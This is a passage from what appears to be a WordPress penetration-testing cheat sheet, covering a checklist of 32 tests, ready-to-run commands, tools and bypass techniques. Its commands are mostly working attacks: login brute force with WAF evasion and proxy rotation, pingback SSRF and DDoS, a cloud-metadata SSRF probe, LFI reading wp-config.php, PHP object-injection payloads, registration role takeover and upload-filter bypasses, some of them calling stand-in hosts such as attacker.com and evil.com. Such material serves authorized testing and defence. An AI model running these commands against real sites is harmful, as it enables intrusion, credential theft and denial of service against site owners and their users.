9. Test wp-cron.php for DoS potential.
10. Enumerate users via REST API, oEmbed endpoint, author archives, and login differential responses.
11. Test Contact Form 7 for HyperLink Injection in auto-response emails and Remote File Upload (CVE in versions ≤5.1.6).
12. Test HubSpot plugin for blind SSRF/DNS exfiltration.
13. Test for Host Header injection.
14. If CVE-2018-6389 is relevant, test load-scripts.php DoS.
15. Check for information disclosure (robots.txt, wp-includes, debug.log).
16. Check for default/leftover WordPress files (readme.html, install.php, upgrade.php, etc.).
17. Test for CORS misconfiguration.
18. Banner grabbing for server/PHP version.
19. TLS/SSL misconfiguration audit (deprecated protocols, weak ciphers).
20. Audit missing security headers.
21. Check plugin REST routes for broken access control (`permission_callback` returning only `is_user_logged_in()`), e.g. Post SMTP `psd/v1` endpoints (CVE-2025-24000). If any SMTP/log plugin present, test Subscriber-level access to email logs for password-reset interception.
22. Test advanced username-disclosure bypasses: `_embed`, wildcard `?search=*`, custom/headless routes, `?_method=GET` override, `X-WP-Nonce: 0`.
23. For WAF-protected login pages, test XML-RPC `system.multicall` amplification (≤2000 `wp.getUsersBlogs` calls/request) and wpscan throttling/proxy flags.
24. Hunt modern config artifacts (`.env.*`, `docker-compose.yml`, `sftp-config.json`, `composer.json`/`package.json` tokens) with ffuf extension fuzzing in webroot, themes, plugins, and `node_modules`.
25. Test registration abuse (`/wp-login.php?action=register`) with `role`/`user_role`/`new_role` parameter fuzzing.
26. Test unauthenticated setup wizard takeover: `/wp-admin/setup-config.php?step=1` and multisite `/wp-admin/network/setup.php`.
27. Enumerate `admin-ajax.php` hidden actions (`wp_ajax_nopriv_`), test serialized AJAX params with phpggc POP chains.
28. Test WPGraphQL introspection, headless login SQLi probes, oEmbed proxy SSRF, and pingback SSRF for internal service discovery.
29. Test plugin/theme file parameters for LFI (encoded traversal, php://filter, pearcmd, session/log file inclusion).
30. Test upload endpoints for blacklist bypasses (double extensions, GIF polyglot, `.htaccess` overwrite, dangerous extensions).
31. Test wp-cron DoS amplification (`doing_wp_cron`) and pingback DDoS only when in scope.
32. Audit plugin update mechanisms and `maybe_unserialize()` usage for supply-chain/deserialization issues.

## Commands

```bash
# WPScan
wpscan --api-token <TOKEN> --url https://target.com
wpscan --url https://target.com --wp-content-dir /wp-content/ --enumerate vp,vt --plugins-detection aggressive --random-user-agent

# Nuclei
nuclei -u https://target.com -tags wordpress

# FFUF WordPress fuzzing
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/wordpress.txt

# Check xmlrpc methods
curl -X POST https://target.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# Enumerate users via REST API
curl https://target.com/wp-json/wp/v2/users

# Enumerate users via oEmbed
curl "https://target.com/wp-json/oembed/1.0/embed?url=https://target.com&format=xml"

# Author enumeration loop
for i in {1..100}; do curl -s -L -i http://target.com/?author=$i | grep -E -o "\" title=\"View all posts by [a-zA-Z0-9\-\.]*|Location:.*" | sed 's/\// /g' | cut -f 6 -d ' ' | grep -v "^$"; done

# Check version
curl -s https://target.com | grep -i '<meta name="generator"' | grep -o 'WordPress[^"]*'
curl https://target.com/readme.html

# Extract plugins
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://target.com/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

# Extract themes
curl -s -X GET https://target.com | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

# Check plugin version
curl https://target.com/wp-content/plugins/<plugin>/readme.txt

# Brute force via Hydra
hydra -l <user> -P passwords.txt target.com http-post-form "/?wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect" -V

# SSRF via pingback.ping
curl -X POST https://target.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com</string></value></param><param><value><string>http://target.com</string></value></param></params></methodCall>'

# Test Host Header injection
curl -H "Host: evil.com" -I https://target.com

# Test Contact Form 7 Remote File Upload
curl -s -o /dev/null -w "%{http_code}" "https://target.com/wp-content/plugins/contact-form-7/modules/file.php"
curl -s "https://target.com/wp-content/plugins/contact-form-7/readme.txt" | grep -i "stable tag"

# Test CVE-2018-6389 (load all registered scripts)
curl -s "https://target.com/wp-admin/load-scripts.php?c=0&load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter"

# Check directory listing
curl https://target.com/wp-content/plugins/

# CORS test
curl -H "Origin: https://evil.com" -I https://target.com

# Banner grabbing
curl -I https://target.com/x.php

# Information disclosure
curl https://target.com/robots.txt
curl https://target.com/wp-content/debug.log

# Default pages
curl https://target.com/readme.html
curl https://target.com/wp-admin/install.php
curl https://target.com/wp-admin/upgrade.php
curl https://target.com/license.txt

# Check Post SMTP plugin version (CVE-2025-24000)
curl -s "https://target.com/wp-content/plugins/post-smtp/readme.txt" | grep -i "stable tag"

# List exposed REST namespaces, grep for psd/v1
curl -s "https://target.com/wp-json/" | jq -r '.routes | keys[]' | grep -i psd

# Test Subscriber-level access to Post SMTP email logs (broken access control)
curl -s 'https://target.com/wp-json/psd/v1/get-logs' -H "X-WP-Nonce: <nonce>" -b 'wordpress_logged_in_<hash>'

# Read a specific email log entry (full message body)
curl -s 'https://target.com/wp-json/psd/v1/get-details?id=<log_id>&type=show_view' -H "X-WP-Nonce: <nonce>"

# Advanced username disclosure bypasses
curl -s "https://target.com/wp-json/wp/v2/posts?per_page=1&_embed" | jq '.[].author'
curl -s "https://target.com/wp-json/wp/v2/users/?search=*&_fields=id,slug,name,url"
curl -s "https://target.com/?rest_route=/wp/v2/users"
curl -s "https://target.com/wp-json/wp/v2/users?per_page=100&_fields=id,slug" -H "X-WP-Nonce: 0"
curl -s -X POST "https://target.com/wp-json/wp/v2/users?_method=GET" | jq 'length'

# WAF-aware bruteforce with throttling + proxy rotation
wpscan --url https://target.com --passwords ./pass.txt --usernames ./users.txt \
  --max-threads 1 --throttle 2000 --random-user-agent \
  --proxy socks5://proxy-pool:1080 --stealthy

# Modern config artifact fuzzing (webroot + wp-content + node_modules)
ffuf -w modern-configs.txt -u https://target.com/FUZZ \
  -fc 404,403 -e .bak,.old,.save,.swp,.txt,.json,.yml,.yaml,.env,.ini -t 50 -ac

# Registration abuse — hidden role parameters
curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/wp-login.php?action=register&role=administrator"
curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/wp-login.php?action=register&user_role=admin"

# Setup wizard takeover probing
curl -s "https://target.com/wp-admin/setup-config.php?step=1" | grep -i "setup-config.php?step=2"
curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/wp-admin/network/setup.php"

# Enumerate admin-ajax actions from plugin JS/PHP
grep -rEo "wp_ajax_nopriv_[a-z_]+" /path/to/plugin-source | sort -u
grep -rEo "admin_url\('admin-ajax\.php'\)" /path/to/plugin-js

# PHP Object Injection via serialized AJAX (POP chain via phpggc)
phpggc -f exploit_class payload_name | base64 -w0
curl -X POST "https://target.com/wp-admin/admin-ajax.php" \
  -d 'action=my_custom_import&data=<serialized-payload>'

# WPGraphQL introspection — dump users + meta
curl -s "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query { users { nodes { id email username roles metaData { key value } } } }"}'

# oEmbed proxy SSRF probes
curl -s "https://target.com/wp-json/oembed/1.0/proxy?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://target.com/wp-json/oembed/1.0/proxy?url=http://localhost:6379/"

# LFI via plugin/theme file params (encoded + wrapper)
curl -s "https://target.com/wp-content/plugins/some-plugin/download.php?file=....//....//....//wp-config.php"
curl -s "https://target.com/wp-content/themes/some-theme/inc/download.php?file=php://filter/convert.base64-encode/resource=wp-config.php" | base64 -d

# wp-cron DoS amplification — trigger a heavy cron hook
curl -s -X POST "https://target.com/wp-cron.php" -d "doing_wp_cron=<heavy-hook-timestamp>"

# Pingback DDoS / SSRF (see Section 29 python snippet)
curl -X POST https://target.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://victim.com/large-file</string></value></param><param><value><string>https://target.com/?p=1</string></value></param></params></methodCall>'

# Subdomain takeover — dangling CNAME checks
dig +short sub.target.com
subzy run --targets subs.txt

# Custom Nuclei template for exposed debug.log
nuclei -u https://target.com -t wp-debug-log-exposed.yaml

# Enumerate cron hooks
wpscan --url https://target.com --enumerate crons
```

## Tools

- **wpscan** — WordPress vulnerability scanner (requires API token for full results); flags: `--plugins-detection mixed`, `--enumerate crons`, `--throttle`, `--stealthy`, `--random-user-agent`, `--proxy`
- **nuclei** — Template-based scanner with WordPress-specific templates + custom templates
- **ffuf** — Web fuzzer for WordPress path discovery (config artifacts, plugin/theme paths)
- **hydra** — Brute force for WordPress login
- **curl** — Manual testing of WordPress endpoints
- **msfconsole** — Metasploit auxiliary module `wordpress_pingback_access` for automated xmlrpc checks
- **doser.go** — Go-based DoS testing tool for stress-testing endpoints like wp-cron.php
- **phpggc** — PHP gadget chain generator for POP chains (serialized AJAX params)
- **jq** — Parse REST/GraphQL JSON responses
- **subzy / subfinder** — Subdomain takeover detection and subdomain enumeration
- **dig** — Dangling CNAME verification
- **dirsearch** — WordPress-specific wordlist brute forcing

## Bypass Techniques

- **xmlrpc brute force bypass**: Use `wp.getUsersBlogs` method to test multiple credentials per request; `system.multicall` packs ≤2000 calls into one request to bypass request-rate counters and WAFs.
- **Login brute force**: Try different login paths (`/wp-login.php`, `/wp-admin`, `/wp-admin/admin-ajax.php`).
- **Username enumeration via different REST API formats**: `?rest_route=/wp/v2/users`, `/wp-json/wp/v2/users`, `/wp-json/wp/v2/users/1`.
- **REST user endpoint 401 bypass**: `?_method=GET` method-override on any public REST endpoint (caching layers/proxies convert POST→GET internally); `X-WP-Nonce: 0` bogus-nonce header for endpoints that only check presence.
- **Username disclosure via `_embed`**: `/wp-json/wp/v2/posts?per_page=1&_embed` leaks author slugs/email hashes.
- **Wildcard user search**: `/wp-json/wp/v2/users/?search=*&_fields=id,slug,name,url` returns the full user list in one call.
- **Registration role takeover**: fuzz `role=`, `user_role=`, `new_role=` parameters on `/wp-login.php?action=register`.
- **Upload blacklist bypasses**: double extensions (`shell.php.jpg`), MIME spoofing (`GIF89a` header), `.phtml`/`.phar`/`.shtml`/`.php7`/`.php5`, `.htaccess` overwrite with `AddType application/x-httpd-php .gif`.
- **LFI filter bypasses**: URL-encode (`%2e%2e%2f`), double-encode (`%252e%252e%252f`), overlong UTF-8 (`..%c0%af`), null byte (`%00`), `....//`, php://filter wrappers, pearcmd trick.
- **WAF-aware bruteforce**: `wpscan --throttle 2000 --max-threads 1 --random-user-agent --proxy socks5://... --stealthy`.

## Notes

- xmlrpc.php being enabled is one of the most common WordPress security issues.
- REST API user enumeration works even on hardened sites if not explicitly disabled.
- Plugin version info in readme.txt is often overlooked during hardening.
- Always check for `.bak`, `.old`, `.swp` extensions of wp-config.php in the web root.
- HyperLink Injection via Contact Form 7 auto-response emails is often missed — email comes from the legitimate verified domain.
- Contact Form 7 version ≤5.1.6 has an unauthenticated Remote File Upload via `modules/file.php` — check plugin version and test the endpoint.
- HubSpot plugin DNS exfiltration works even when no HTTP response is returned (blind).
- Most WordPress vulnerabilities stem from insecure plugins and themes, not the core.
- Check both `/wp-admin` and custom login paths like `/wp-login-secure.php`.
- wpscan with free API token significantly improves plugin/theme vulnerability detection.
- Plugin REST routes whose `permission_callback` only checks `is_user_logged_in()` (no capability check) are a broken-access-control signal — Post SMTP ≤3.2.0 (CVE-2025-24000) allowed any Subscriber to read full email logs and hijack admin via password-reset interception.
- Email-logging SMTP plugins are high-value targets: they store every outbound email (incl. password resets, activation links), so test low-privilege access to their REST endpoints.
- Attackers rarely target WP core — the real attack surface is plugins, custom themes, exposed admin functionality, and configuration weaknesses.
- `admin-ajax.php` unauthenticated actions (`wp_ajax_nopriv_*`) are one of the most overlooked attack surfaces — grep plugin source for registered actions before fuzzing.
- `maybe_unserialize()` on user input is still the #1 RCE vector in plugins — audit any plugin using it on untrusted data.
- `?rest_route=` bypasses pretty-permalink rewriting — the REST API is reachable even when `/wp-json/` looks disabled.
- oEmbed proxy (`/wp-json/oembed/1.0/proxy`) and pingback (`pingback.ping`) are the two classic WordPress SSRF sinks — both often still open.
- Multisite networks: `/wp-admin/network/setup.php` and user-creation routes are commonly left unprotected after setup.
- Supply-chain auditing: diff plugin updates for new `eval()`, `system()`, `base64_decode()` calls; watch for `pre_set_site_transient_update_plugins` filters pointing at attacker servers.

## References

- https://wpvulndb.com
- https://cvedetails.com
- https://github.com/wpscanteam/wpscan
- https://medium.com/@far00t01/wordpress-pentesting-c57f4c11f6f1
- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
- https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html
- https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/
- https://hackerone.com/reports/2299069
- https://hackerone.com/reports/1619536
- https://hackerone.com/reports/752073
- https://hackerone.com/reports/2334446
- https://patchstack.com/articles/account-takeover-vulnerability-affecting-over-400k-installations-patched-in-post-smtp-plugin/
- https://nvd.nist.gov/vuln/detail/CVE-2025-24000
- https://www.bleepingcomputer.com/news/security/post-smtp-plugin-flaw-exposes-200k-wordpress-sites-to-hijacking-attacks/
- https://medium.com/@0xSilent/mastering-modern-wordpress-bug-hunting-advanced-techniques-bypasses-weaponized-exploits-f5f33561d0dd
